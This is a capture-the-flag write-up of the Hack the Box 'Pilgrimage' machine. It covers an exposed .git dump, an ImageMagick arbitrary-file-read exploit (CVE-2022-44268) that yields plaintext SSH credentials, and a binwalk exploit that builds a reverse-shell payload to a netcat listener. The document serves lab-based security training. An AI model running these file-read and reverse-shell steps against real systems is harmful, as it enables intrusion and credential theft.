# Hack the Box - Pilgrimage

### Port Scan
```JS
rustscan -a 10.10.11.219 -r 0-65535 --ulimit 5000
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e689b57a-a922-4249-bd1f-e9fa6a10c6b1)

### Service Scan
```JS
nmap -sV -sC -A --min-rate 1000 10.10.11.219 -p 22,80
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8e7088bb-eda7-48c9-a997-9aff249734e7)

### HTTP
#### /index.php
```
http://pilgrimage.htb/index.php
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/926d244a-ec49-4f00-b52e-2470dcf12de7)

#### /login.php
```
http://pilgrimage.htb/login.php
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/91c3655e-75c4-4434-a7c0-6cb6ffb4f416)

#### /register.php
```
http://pilgrimage.htb/register.php
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ae7ea9df-3379-4ae2-9bb1-21aab0840fb0)

#### /.git
```
http://pilgrimage,htb/.git/
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cf236a5d-c1d5-4e61-b79b-51f8ee5df32f)

### Dump /.git
```JS
git-dumper http://pilgrimage.htb/.git/ git
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8e034218-7ed2-4956-b0e3-821f84f9a665)

## Interaction
### Create Account
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8aace601-5083-47e0-9097-4d362135c8cb)

### Login
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/59281814-60c3-4606-aa98-5b736e27baee)

### Dashboard
```
http://pilgrimage.htb/dashboard.php
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2baf238c-a0fd-4fa2-8492-96816f3450e4)

### Shrink Image
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/28416acf-9319-4a20-aca5-0f2477231c16)

### Shrunk Image
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/45222057-30a0-40cb-9236-277ac66f3cdb)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b7769831-449a-4948-ad62-33f08d6fbae5)

## Source Code
- The code uses "magick" to shrink the uploaded image.
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e1e8ac77-b705-4a8a-a2f3-a1e887ede57d)

### Search Exploits
```
searchsploit magick
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dfc0dea8-95b2-412e-9509-488bcf24d57e)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2a7440d9-e578-4433-a503-4c280c16ddd1)

### Exploit - Magick (Arbitrary File Read): CVE-2022-44268
The exploit allows to read arbitrary files on the server.
The suggested exploit is scripted in rust. I will be using an explot scripted in python.
```
https://github.com/kljunowsky/CVE-2022-44268
```
- Prepare Payload
```Python
python3 CVE-2022-44268.py --image image.png --file-to-read /etc/passwd --output payload.png
```
- Upload Payload
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e9cba83e-70ca-4960-a5f2-1807331d9673)

- Payload URL
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/81f3e148-a8bb-4973-8a8b-ff322b454fd6)

- Read Files
```
python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64f5b8058a661.png
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d7fb8b1c-f9c6-4481-8c53-532b754d4bd8)

- Identified Users
  - root
  - emily

- The code in `/register.php` contains:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4c690079-74ee-4b7b-b598-9bdad2152018)

- Prepare a payload and read the file as done in the previous step. I had to modify the script as it was throwing an error. Now I get the output as hex.
```
python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64f5bc11c30f2.png | tee data.hex
```
- Convert the received hex data as an image to string.
```
cat data.hex | xxd -r -p && echo ''
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bf82acca-237f-434e-8797-cebf1f19f690)

- Credentials found: emily:abigchonkyboi123

### FootHold
```
ssh emily@10.10.11.219
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c917b15a-555d-4fc4-8dd2-b21d8c8be882)

### List Processes
```
ps -aux
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f693978e-2530-4cfd-97de-bc04979feabf)

- Contents of `/usr/sbin/malwarescan.sh`
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c61faa6e-3264-4917-a728-9faef849e886)

- The bash script uses a command `inotifywait` to monitor a directory for newly created files and then checks if the content of those files contains certain blacklisted phrases using the `binwalk` tool.
- binwalk version 2.3.2
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/33e56901-7cee-48a7-9490-5a39a42abc38)

### Search Exploits
```
searchsploit binwalk
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/13ca1261-42a7-4550-859e-a0ded4e1810f)
```
searchsploit -m python/remote/51249.py
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ef00376b-efa4-4888-b85a-642cb5318652)

- Prepare Payload
```
python3 51249.py poison.png 10.10.14.61 4444 
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/378aa7bf-e083-41ed-a953-0fa7154bb520)
- Rename Exploit
```
mv binwalk_exploit.png pwnstuff.png
```
- Start a netcat listener
```
rlwrap nc -nlvvp 4444
```
- Start a local python server
```
python -m http.server 9999
```
- Upload the payload file (binwalk_exploit.png) to the target. Since the bash script `malwarescan.sh` uses the binwalk tool to scan the images uploaded to the `/var/www/pilgrimage.htb/shrunk` directory, the payload needs to be placed here.
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9623d341-033c-4935-aa82-945a668c3498)

